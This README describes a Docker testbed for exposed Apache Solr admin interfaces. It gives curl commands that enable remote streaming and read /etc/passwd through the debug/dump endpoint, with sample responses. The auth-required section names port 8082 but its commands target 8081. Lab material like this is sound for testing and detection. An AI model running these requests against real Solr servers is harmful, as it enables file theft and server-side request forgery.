# Apache Solr - Exposed UI

## Overview

This testbed contains a docker compose setup for Apache Solr Exposed UIs that allow Local File Reads (LFI) and Server-Side Request Forgery (SSRF). It uses an older version (8.11.2), but newer versions can also be vulnerable when explicitly configured before starting the solr instance. The older version allows changing the configuration via the API.

## Docker Compose

```
docker compose up
```

The vulnerable instance will run on port 8081 and the auth-required instance will run on port 8082.

## Testing the Vulnerability

### Vulnerable Instance

1. Run the following command to enable remote streaming:
```
curl -X POST localhost:8081/solr/configuredcore/config -d "{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
```
Response:
```
{
  "responseHeader":{
    "status":0,
    "QTime":383},
  "WARNING":"This response format is experimental.  It is likely to change in the future."}
```
2. Run the following command to stream from a URL or file (this one is for file:///etc/passwd):
```
curl 'localhost:8081/solr/configuredcore/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
```
Response:
```
{
  ...
  "stream":"root:x:0:0:root:/root:..."
  ...
}
```

### Auth-Required Instance

1. Run the following command to enable remote streaming:
```
curl -X POST localhost:8081/solr/configuredcore/config -d "{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
```
Response:
```
...
<body><h2>HTTP ERROR 401 Authentication failed, Response code: 401</h2>
...
```
2. Run the following command to stream from a URL or file (this one is for file:///etc/passwd):
```
curl 'localhost:8081/solr/configuredcore/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
```
Response:
```
{
  "error":{
    "metadata":[
      "error-class","org.apache.solr.common.SolrException",
      "root-error-class","org.apache.solr.common.SolrException"],
    "msg":"Remote Streaming is disabled.",
    "code":400}}
```